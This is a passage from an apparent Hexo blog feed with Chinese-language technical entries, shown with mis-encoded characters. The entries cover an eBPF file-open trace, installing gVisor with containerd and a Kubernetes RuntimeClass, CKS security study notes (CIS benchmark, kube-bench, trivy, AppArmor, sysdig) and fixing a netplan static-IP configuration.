class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.current&#x27;</span><br>0.250011319        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.min&#x27;</span><br>0.250028852        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.low&#x27;</span><br>0.250045734        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.swap.current&#x27;</span><br>0.250062576        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.stat&#x27;</span><br>0.250117370        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/proc/meminfo&#x27;</span><br>0.499947185        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/proc/meminfo&#x27;</span><br>0.537863286        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/etc/ld.so.cache&#x27;</span><br>0.537898282        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>0.538648765        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/lib/locale/locale-archive&#x27;</span><br>0.538766849        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale/locale.alias&#x27;</span><br>0.538832774        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale/en_US/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.538838585        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale/en/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.538844537        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale-langpack/en_US/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.538850207        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale-langpack/en/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.538868322        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/proc/meminfo&#x27;</span><br>0.539986006        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/etc/ld.so.cache&#x27;</span><br>0.540310641        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>0.541208063        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/lib/locale/locale-archive&#x27;</span><br>0.541523040        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale/locale.alias&#x27;</span><br>0.541664007        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale/en_US/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.541768956        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale/en/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.541841113        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale-langpack/en_US/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.541911206        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale-langpack/en/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.541993672        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/stat&#x27;</span><br>0.542297589        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/version&#x27;</span><br>0.542427826        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/uptime&#x27;</span><br>0.542513568        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/loadavg&#x27;</span><br>0.542576598        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/sys/fs/file-nr&#x27;</span><br>0.542649275        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/sys/kernel/hostname&#x27;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ebpf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘(202301) gvisorå®‰è£…ä¸containerdé›†æˆ</title>
    <link href="/2023/01/11/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202301)%20gvisor%E5%AE%89%E8%A3%85%E4%B8%8Econtainerd%E9%9B%86%E6%88%90/"/>
    <url>/2023/01/11/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202301)%20gvisor%E5%AE%89%E8%A3%85%E4%B8%8Econtainerd%E9%9B%86%E6%88%90/</url>
    
    <content type="html"><![CDATA[<h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>å®‰è£…åœ°å€ï¼š<a href="https://gvisor.dev/docs/user_guide/install/">Installation - gVisor</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">ARCH=$(<span class="hljs-built_in">uname</span> -m)<br>URL=https://storage.googleapis.com/gvisor/releases/release/latest/<span class="hljs-variable">$&#123;ARCH&#125;</span><br>wget <span class="hljs-variable">$&#123;URL&#125;</span>/runsc <span class="hljs-variable">$&#123;URL&#125;</span>/runsc.sha512 \<br>  <span class="hljs-variable">$&#123;URL&#125;</span>/containerd-shim-runsc-v1 <span class="hljs-variable">$&#123;URL&#125;</span>/containerd-shim-runsc-v1.sha512<br><span class="hljs-built_in">sha512sum</span> -c runsc.sha512 \<br>  -c containerd-shim-runsc-v1.sha512<br><span class="hljs-built_in">rm</span> -f *.sha512<br><span class="hljs-built_in">chmod</span> a+rx runsc containerd-shim-runsc-v1<br>sudo <span class="hljs-built_in">mv</span> runsc containerd-shim-runsc-v1 /usr/local/bin<br><br></code></pre></td></tr></table></figure><h2 id="ä¸containerdé›†æˆ"><a href="#ä¸containerdé›†æˆ" class="headerlink" title="ä¸containerdé›†æˆ"></a>ä¸containerdé›†æˆ</h2><h3 id="ä¸‹å‘runtimeclassèµ„æº"><a href="#ä¸‹å‘runtimeclassèµ„æº" class="headerlink" title="ä¸‹å‘runtimeclassèµ„æº"></a>ä¸‹å‘runtimeclassèµ„æº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@node01:~<span class="hljs-comment"># cat rc.yaml</span><br>apiVersion: node.k8s.io/v1<br>kind: RuntimeClass<br>metadata:<br>  name: untrusted<br>handler: runsc<br>root@node01:~<span class="hljs-comment"># kubectl apply -f rc.yaml</span><br>root@node01:~<span class="hljs-comment"># kubectl get runtimeclass</span><br>NAME        HANDLER   AGE<br>untrusted   runsc     7m34s<br><br></code></pre></td></tr></table></figure><h3 id="ä¿®æ”¹containerdé…ç½®æ–‡ä»¶"><a href="#ä¿®æ”¹containerdé…ç½®æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹containerdé…ç½®æ–‡ä»¶"></a>ä¿®æ”¹containerdé…ç½®æ–‡ä»¶</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>containerd/config.toml<br></code></pre></td></tr></table></figure><p>å¢åŠ </p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># gVisor: https://gvisor.dev/</span><br><span class="hljs-section">[plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes.runsc]</span><br>  <span class="hljs-attr">runtime_type</span> = <span class="hljs-string">&quot;io.containerd.runsc.v1&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111212808.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># é‡å¯containerd</span><br>root@node01:~<span class="hljs-comment"># systemctl restart containerd</span><br></code></pre></td></tr></table></figure><h3 id="å‡†å¤‡podçš„yamlæ–‡ä»¶"><a href="#å‡†å¤‡podçš„yamlæ–‡ä»¶" class="headerlink" title="å‡†å¤‡podçš„yamlæ–‡ä»¶"></a>å‡†å¤‡podçš„yamlæ–‡ä»¶</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@node01:~<span class="hljs-comment"># kubectl run nginx-gvisor --image=nginx --dry-run=client -oyaml</span><br>apiVersion: v1<br>kind: Pod<br>metadata:<br>  creationTimestamp: null<br>  labels:<br>    run: nginx-gvisor<br>  name: nginx-gvisor<br>spec:<br>  containers:<br>  - image: nginx<br>    name: nginx-gvisor<br>    resources: &#123;&#125;<br>  dnsPolicy: ClusterFirst<br>  restartPolicy: Always<br>status: &#123;&#125;<br><br>root@node01:~<span class="hljs-comment">#  kubectl run nginx-gvisor --image=nginx --dry-run=client -oyaml &gt; nginx-gvisor.yaml</span><br><br><br><span class="hljs-comment">## ç¨åŠ ä¿®æ”¹ï¼Œæœ€ç»ˆå¦‚ä¸‹</span><br>root@node01:~<span class="hljs-comment"># cat nginx-gvisor.yaml</span><br>apiVersion: v1<br>kind: Pod<br>metadata:<br>  name: nginx-gvisor<br>spec:<br>  runtimeClassName: untrusted<br>  containers:<br>  - image: nginx<br>    name: nginx-gvisor<br><br>root@node01:~<span class="hljs-comment"># kubectl apply -f nginx-gvisor.yaml</span><br><br>root@node01:~<span class="hljs-comment"># kubectl get pod</span><br>NAME           READY   STATUS    RESTARTS        AGE<br>nginx-gvisor   1/1     Running   0               8m3s<br><br></code></pre></td></tr></table></figure><p>æˆäº†~</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://blog.51cto.com/u_14035463/5583894">### Kubernetes æœ€å°åŒ–å¾®æœåŠ¡æ¼æ´ gVisorä¸Containerdé›†æˆ</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
      <tag>gvisor</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘cks</title>
    <link href="/2023/01/03/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91cks/"/>
    <url>/2023/01/03/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91cks/</url>
    
    <content type="html"><![CDATA[<h2 id="CISå®‰å…¨åŸºå‡†"><a href="#CISå®‰å…¨åŸºå‡†" class="headerlink" title="CISå®‰å…¨åŸºå‡†"></a>CISå®‰å…¨åŸºå‡†</h2><p>äº’è”ç½‘å®‰å…¨ä¸­å¿ƒï¼ˆCISï¼ŒCenter for Internet Securityï¼‰ï¼Œæ˜¯ä¸€ä¸ªéç›ˆåˆ©ç»„ç»‡ï¼Œè‡´åŠ›äºä¸ºäº’è”ç½‘æä¾›å…è´¹çš„å®‰å…¨é˜²å¾¡è§£å†³æ–¹æ¡ˆã€‚</p><p>å®˜ç½‘ï¼š<a href="https://www.cisecurity.org/">https://www.cisecurity.org/</a><br>kubernetes CISæ ‡å‡†ï¼š<a href="https://www.cisecurity.org/benchmark/kubernetes">https://www.cisecurity.org/benchmark/kubernetes</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230103231424.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230103231523.png" alt="image.png"></p><h2 id="CISåŸºå‡†æµ‹è¯•å·¥å…·"><a href="#CISåŸºå‡†æµ‹è¯•å·¥å…·" class="headerlink" title="CISåŸºå‡†æµ‹è¯•å·¥å…·"></a>CISåŸºå‡†æµ‹è¯•å·¥å…·</h2><p>kube-benchæ˜¯å®¹å™¨å®‰å…¨å‚å•†Aquqæ¨å‡ºçš„å·¥å…·ï¼Œä»¥CIS k8såŸºå‡†å«åŸºç¡€ï¼Œæ¥æ£€æŸ¥k8sæ˜¯å¦å®‰å…¨éƒ¨ç½²ã€‚ä¸»è¦æŸ¥æ‰¾ä¸å®‰å…¨çš„é…ç½®å‚æ•°ã€æ•æ„Ÿçš„æ–‡ä»¶æƒé™ã€ä¸å®‰å…¨çš„è´¦æˆ·æˆ–å…¬å¼€ç«¯å£ç­‰ç­‰ã€‚</p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/aquasecurity/kube-bench">https://github.com/aquasecurity/kube-bench</a></p><h2 id="gVisor"><a href="#gVisor" class="headerlink" title="gVisor"></a>gVisor</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111203206.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111203352.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111203427.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111203902.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111204332.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111204802.png" alt="image.png"></p><h2 id="trivy"><a href="#trivy" class="headerlink" title="trivy"></a>trivy</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111222445.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111223213.png" alt="image.png"></p><h2 id="AppArmor"><a href="#AppArmor" class="headerlink" title="AppArmor"></a>AppArmor</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225002.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225039.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225156.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225540.png" alt="image.png"></p><p>ubuntuçš„å†…æ ¸å·²ç»å†…ç½®äº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225848.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225942.png" alt="image.png"></p><h2 id="sysdig"><a href="#sysdig" class="headerlink" title="sysdig"></a>sysdig</h2><p>å®Œæ•´çš„è¿‡æ»¤å™¨åˆ—è¡¨å¯ä»¥ä½¿ç”¨Â sysdig -lÂ æ¥æŸ¥çœ‹</p><h2 id="å‘½ä»¤å’Œç½‘å€"><a href="#å‘½ä»¤å’Œç½‘å€" class="headerlink" title="å‘½ä»¤å’Œç½‘å€"></a>å‘½ä»¤å’Œç½‘å€</h2><p><a href="https://kubernetes.io/zh-cn/docs/reference/kubectl/cheatsheet/">kubectl å¤‡å¿˜å•</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘cks</title>
    <link href="/2023/01/03/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91cks/"/>
    <url>/2023/01/03/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91cks/</url>
    
    <content type="html"><![CDATA[<h2 id="CISå®‰å…¨åŸºå‡†"><a href="#CISå®‰å…¨åŸºå‡†" class="headerlink" title="CISå®‰å…¨åŸºå‡†"></a>CISå®‰å…¨åŸºå‡†</h2><p>äº’è”ç½‘å®‰å…¨ä¸­å¿ƒï¼ˆCISï¼ŒCenter for Internet Securityï¼‰ï¼Œæ˜¯ä¸€ä¸ªéç›ˆåˆ©ç»„ç»‡ï¼Œè‡´åŠ›äºä¸ºäº’è”ç½‘æä¾›å…è´¹çš„å®‰å…¨é˜²å¾¡è§£å†³æ–¹æ¡ˆã€‚</p><p>å®˜ç½‘ï¼š<a href="https://www.cisecurity.org/">https://www.cisecurity.org/</a><br>kubernetes CISæ ‡å‡†ï¼š<a href="https://www.cisecurity.org/benchmark/kubernetes">https://www.cisecurity.org/benchmark/kubernetes</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230103231424.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230103231523.png" alt="image.png"></p><h2 id="CISåŸºå‡†æµ‹è¯•å·¥å…·"><a href="#CISåŸºå‡†æµ‹è¯•å·¥å…·" class="headerlink" title="CISåŸºå‡†æµ‹è¯•å·¥å…·"></a>CISåŸºå‡†æµ‹è¯•å·¥å…·</h2><p>kube-benchæ˜¯å®¹å™¨å®‰å…¨å‚å•†Aquqæ¨å‡ºçš„å·¥å…·ï¼Œä»¥CIS k8såŸºå‡†å«åŸºç¡€ï¼Œæ¥æ£€æŸ¥k8sæ˜¯å¦å®‰å…¨éƒ¨ç½²ã€‚ä¸»è¦æŸ¥æ‰¾ä¸å®‰å…¨çš„é…ç½®å‚æ•°ã€æ•æ„Ÿçš„æ–‡ä»¶æƒé™ã€ä¸å®‰å…¨çš„è´¦æˆ·æˆ–å…¬å¼€ç«¯å£ç­‰ç­‰ã€‚</p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/aquasecurity/kube-bench">https://github.com/aquasecurity/kube-bench</a></p><h2 id="gVisor"><a href="#gVisor" class="headerlink" title="gVisor"></a>gVisor</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111203206.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111203352.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111203427.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111203902.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111204332.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111204802.png" alt="image.png"></p><h2 id="trivy"><a href="#trivy" class="headerlink" title="trivy"></a>trivy</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111222445.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111223213.png" alt="image.png"></p><h2 id="AppArmor"><a href="#AppArmor" class="headerlink" title="AppArmor"></a>AppArmor</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225002.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225039.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225156.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225540.png" alt="image.png"></p><p>ubuntuçš„å†…æ ¸å·²ç»å†…ç½®äº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225848.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225942.png" alt="image.png"></p><h2 id="sysdig"><a href="#sysdig" class="headerlink" title="sysdig"></a>sysdig</h2><p>å®Œæ•´çš„è¿‡æ»¤å™¨åˆ—è¡¨å¯ä»¥ä½¿ç”¨Â sysdig -lÂ æ¥æŸ¥çœ‹</p><h2 id="å‘½ä»¤å’Œç½‘å€"><a href="#å‘½ä»¤å’Œç½‘å€" class="headerlink" title="å‘½ä»¤å’Œç½‘å€"></a>å‘½ä»¤å’Œç½‘å€</h2><p><a href="https://kubernetes.io/zh-cn/docs/reference/kubectl/cheatsheet/">kubectl å¤‡å¿˜å•</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘å¡æ²¡æœ‰ip</title>
    <link href="/2022/12/28/net/%E7%BD%91%E5%8D%A1%E6%B2%A1%E6%9C%89ip/"/>
    <url>/2022/12/28/net/%E7%BD%91%E5%8D%A1%E6%B2%A1%E6%9C%89ip/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221228224845.png" alt="image.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">root@ningan</span> <span class="hljs-string">netplan</span>]<span class="hljs-comment"># cat 01-network-manager-all.yaml</span><br><span class="hljs-comment"># Let NetworkManager manage all devices on this system</span><br><span class="hljs-attr">network:</span><br>  <span class="hljs-attr">version:</span> <span class="hljs-number">2</span><br>  <span class="hljs-attr">renderer:</span> <span class="hljs-string">NetworkManager</span><br>  <span class="hljs-attr">ethernets:</span><br>    <span class="hljs-attr">eth0:</span><br>      <span class="hljs-attr">dhcp4:</span> <span class="hljs-literal">yes</span><br>      <span class="hljs-attr">dhcp6:</span> <span class="hljs-literal">yes</span><br>    <span class="hljs-attr">eth1:</span><br>      <span class="hljs-attr">dhcp4:</span> <span class="hljs-literal">no</span><br>      <span class="hljs-attr">dhcp6:</span> <span class="hljs-literal">no</span><br>      <span class="hljs-attr">addresses:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.201</span><span class="hljs-string">/24</span><br>      <span class="hljs-attr">routes:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">to:</span> <span class="hljs-string">default</span><br>          <span class="hljs-attr">via:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.20</span><br>      <span class="hljs-attr">nameservers:</span><br>        <span class="hljs-attr">addresses:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span><br><br>[<span class="hljs-string">root@ningan</span> <span class="hljs-string">netplan</span>]<span class="hljs-comment"># netplan apply</span><br><br><span class="hljs-string">(generate:22000):</span> <span class="hljs-string">GLib-WARNING</span> <span class="hljs-string">**:</span> <span class="hljs-attr">23:11:36.612:</span> <span class="hljs-string">GError</span> <span class="hljs-string">set</span> <span class="hljs-string">over</span> <span class="hljs-string">the</span> <span class="hljs-string">top</span> <span class="hljs-string">of</span> <span class="hljs-string">a</span> <span class="hljs-string">previous</span> <span class="hljs-string">GError</span> <span class="hljs-string">or</span> <span class="hljs-string">uninitialized</span> <span class="hljs-string">memory.</span><br><span class="hljs-string">This</span> <span class="hljs-string">indicates</span> <span class="hljs-string">a</span> <span class="hljs-string">bug</span> <span class="hljs-string">in</span> <span class="hljs-string">someone&#x27;s</span> <span class="hljs-string">code.</span> <span class="hljs-string">You</span> <span class="hljs-string">must</span> <span class="hljs-string">ensure</span> <span class="hljs-string">an</span> <span class="hljs-string">error</span> <span class="hljs-string">is</span> <span class="hljs-literal">NULL</span> <span class="hljs-string">before</span> <span class="hljs-string">it&#x27;s</span> <span class="hljs-string">set.</span><br><span class="hljs-attr">The overwriting error message was: /etc/netplan/01-network-manager-all.yaml:15:9: Error in network definition:</span> <span class="hljs-string">unicast</span> <span class="hljs-string">route</span> <span class="hljs-string">must</span> <span class="hljs-string">include</span> <span class="hljs-string">both</span> <span class="hljs-string">a</span> <span class="hljs-string">&#x27;to&#x27;</span> <span class="hljs-string">and</span> <span class="hljs-string">&#x27;via&#x27;</span> <span class="hljs-string">IP</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">to:</span> <span class="hljs-string">default</span><br>        <span class="hljs-string">^</span><br><span class="hljs-string">/etc/netplan/01-network-manager-all.yaml:15:15:</span> <span class="hljs-attr">Error in network definition:</span> <span class="hljs-string">invalid</span> <span class="hljs-string">IP</span> <span class="hljs-string">family</span> <span class="hljs-string">&#x27;-1&#x27;</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">to:</span> <span class="hljs-string">default</span><br>              <span class="hljs-string">^</span><br><br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Let NetworkManager manage all devices on this system</span><br><span class="hljs-attr">network:</span><br>  <span class="hljs-attr">version:</span> <span class="hljs-number">2</span><br>  <span class="hljs-attr">renderer:</span> <span class="hljs-string">NetworkManager</span><br>  <span class="hljs-attr">ethernets:</span><br>    <span class="hljs-attr">eth0:</span><br>      <span class="hljs-attr">dhcp4:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">eth1:</span>                           <span class="hljs-comment"># é…ç½®ç½‘å¡çš„åç§°,é€šè¿‡ ip a å‘½ä»¤æŸ¥çœ‹</span><br>      <span class="hljs-attr">dhcp4:</span> <span class="hljs-literal">false</span>                    <span class="hljs-comment"># å…³é—­ DHCPï¼Œå¦‚æœéœ€è¦æ‰“å¼€ DHCP åˆ™å†™ true</span><br>      <span class="hljs-attr">addresses:</span> [<span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.201</span><span class="hljs-string">/24</span>]    <span class="hljs-comment"># é…ç½®çš„é™æ€ IP åœ°å€å’Œæ©ç </span><br>      <span class="hljs-attr">optional:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-attr">gateway4:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.20</span>            <span class="hljs-comment"># ç½‘å…³åœ°å€</span><br>      <span class="hljs-attr">nameservers:</span><br>        <span class="hljs-attr">addresses:</span> [<span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>,<span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span>]       <span class="hljs-comment"># DNS 